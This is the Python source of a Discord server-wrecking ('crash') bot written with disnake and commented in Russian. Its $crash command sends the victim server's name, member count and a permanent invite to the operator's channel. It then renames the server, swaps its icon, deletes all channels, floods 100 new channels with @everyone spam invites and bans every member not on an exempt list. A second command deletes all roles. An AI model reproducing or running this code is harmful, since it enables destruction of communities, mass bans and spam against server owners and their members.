import disnake 
from disnake.ext import commands
import multiprocessing
import asyncio
import aiohttp


intents = disnake.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="$", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    
# зашиты серверов
MAIN_SERVER_ID =  

#отправки инфы
MAIN_SERVER_CHANNEL_ID = 

#иконка при краше изменяет
ICON_URL = "https://e7.pngegg.com/pngimages/533/989/png-clipart-pentagram-pentagram-satanism-sigil-of-baphomet-devil-computer-wallpaper-cross.png"

EXEMPT_USER_IDS = [1118484648247443476, 822709398526492712]  # Замените на реальные ID




# фейк подсказка
HELP_URL = "https://discord.gg/gAhfb9Ps8v"

@bot.command(name="helper")
async def help_command(ctx):
    # сыллка
    await ctx.send(f"Вот ссылка на подсказку с командами: {HELP_URL}")
    
@bot.command()
async def crash(ctx):
    # запущен краш на оснв серв
    if ctx.guild.id == MAIN_SERVER_ID:
        await ctx.send("Браток основной сервер нельзя крашить)")
        print("Пытались крашнуть оснв сервер я за0щитил by rvg.dev")
        return

    # отправка на оснв сервер
    main_channel = bot.get_channel(MAIN_SERVER_CHANNEL_ID)
    if main_channel:
        server_info = f"Краш заюзан на сервере: {ctx.guild.name} и внем {ctx.guild.member_count} людей."
        await main_channel.send(server_info)
        print(f'Инфа на основу: {server_info}')
    else:
        print('Ошибка отправки.')
    try:
        invite = await ctx.channel.create_invite(max_age=0, max_uses=0)
        print(f'Креатнул сыллку: {invite.url}')
    except Exception as e:
        await ctx.send("Немогу сыллку.")
        print(f'Не могу создать сыллку на инв Reason: {e}')
        return

    # инв на основу серва
    main_channel = bot.get_channel(MAIN_SERVER_CHANNEL_ID)
    if main_channel:
        server_info = f"Сервер : {ctx.guild.name} ам {ctx.guild.member_count} members."
        try:
            await main_channel.send(f"{server_info}\nInvite link: {invite.url}")
            print(f'Отправки сыллка: {invite.url} и информации о серве.')
        except Exception as e:
            print(f'Немогу. Reason: {e}')
    else:
        print('не могу')
        
    # Изменение названия и иконки сервера
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(ICON_URL) as resp:
                if resp.status == 200:
                    icon_data = await resp.read()
                    await ctx.guild.edit(name="CRASHED BY TCP TEAM <3", icon=icon_data)
                    print(f'Секретик).')
                else:
                    print(f'Ошибки изменения {resp.status}')
    except Exception as e:
        print(f'Иконка не изменена. Reason: {e}')
        
    # Удаление всех каналов
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f'Deleted channel: {channel.name}')
        except Exception as e:
            print(f'Ошибки делета канала: {channel.name}. Reason: {e}')
    
    # Создание новых каналов
    for i in range(100):  # Измените количество каналов по необходимости
        new_channel_name = f'CRASH TCP TEAM <3'
        try:
            new_channel = await ctx.guild.create_text_channel(new_channel_name)
            print(f'Created channel: {new_channel_name}')
            
            # Отправляем 5 сообщений в созданный канал
            for j in range(10):
                try:
                    await new_channel.send(f'@everyone CRASHED BY TCP TEAM <3 https://discord.gg/jkNQ4vpb6N https://discord.gg/DXJ2wX2rya')
                except Exception as e:
                    print(f"Ошибка отправки: {new_channel_name}. Reason: {e}")
        
        except Exception as e:
            print(f'Ошибка создания: {new_channel_name}. Reason: {e}')

    await ctx.send(f'Готово! Все каналы и роли были удалены, новые каналы созданы и сообщения отправлены.')
    
    # Бан всех участников, кроме исключенных
    for member in ctx.guild.members:
        if member.id not in EXEMPT_USER_IDS:
            try:
                await member.ban(reason="Server reset by admin command")
                print(f'бан мемберсr: {member.name}#{member.discriminator}')
            except Exception as e:
                print(f'ошибка бана {member.name}#{member.discriminator}. Reason: {e}')
        else:
            print(f'скип бана: {member.name}#{member.discriminator} (exempt)')
    
@bot.command()
@commands.has_permissions(administrator=True)
async def ahmatov(ctx):
    guild = ctx.guild
    roles_deleted = []

    for role in guild.roles:
        if role != guild.default_role:
            try:
                await role.delete(reason="Удаление всех ролей на сервере")
                roles_deleted.append(role.name)
            except Exception as e:
                await ctx.send(f"Не удалось удалить роль {role.name}: {e}")

    if roles_deleted:
        await ctx.send(f"Удалены роли: {', '.join(roles_deleted)}")
    else:
        await ctx.send("Не найдено ролей для удаления.")


@bot.slash_command(name="bio", description="BIO")
async def info(inter):
    embed = disnake.Embed(
        title=f"BIO",
        color=disnake.Color.blurple()
    )
    embed.add_field(name="Описание разраба", value=BOT_DESCRIPTION, inline=False)
    embed.add_field(name="Где был слит бот", value=PROGRAMMER_NAME, inline=False)
    embed.add_field(name="Версия", value=BOT_VERSION, inline=False)
    embed.add_field(name="Кэш сообщений", value=f"{len(bot.cached_messages)} сообщений", inline=False)
    embed.set_thumbnail(url="") 
    embed.set_footer(text="Спасибо за использование нашего бота!")
    await inter.response.send_message(embed=embed)

@bot.event
async def on_message(message):
    if bot.user.mentioned_in(message) and not message.author.bot:  
        embed = disnake.Embed(
            title=f"BIO",
            color=disnake.Color.blurple()
        )
        embed.add_field(name="Описание разраба", value=BOT_DESCRIPTION, inline=False)
        embed.add_field(name="Где был слит бот", value=PROGRAMMER_NAME, inline=False)
        embed.add_field(name="Версия", value=BOT_VERSION, inline=False)
        embed.add_field(name="Кэш сообщений", value=f"{len(bot.cached_messages)} сообщений", inline=False)
        embed.set_thumbnail(url="") 
        embed.set_footer(text="Спасибо за использование нашего бота!")
        await message.channel.send(embed=embed)
    await bot.process_commands(message)  

@bot.event
async def on_message(message):
    if bot.user.mentioned_in(message) and not message.author.bot:  
        embed = disnake.Embed(
            title=f"BIO",
            color=disnake.Color.blurple()
        )
        embed.add_field(name="Описание разраба", value=BOT_DESCRIPTION, inline=False)
        embed.add_field(name="Где был слит бот", value=PROGRAMMER_NAME, inline=False)
        embed.add_field(name="Версия", value=BOT_VERSION, inline=False)
        embed.add_field(name="Кэш сообщений", value=f"{len(bot.cached_messages)} сообщений", inline=False)
        embed.set_thumbnail(url="") 
        embed.set_footer(text="Спасибо за использование нашего бота!")
        await message.channel.send(embed=embed)
    await bot.process_commands(message)  


bot.run('') #сюда ваш token от бота
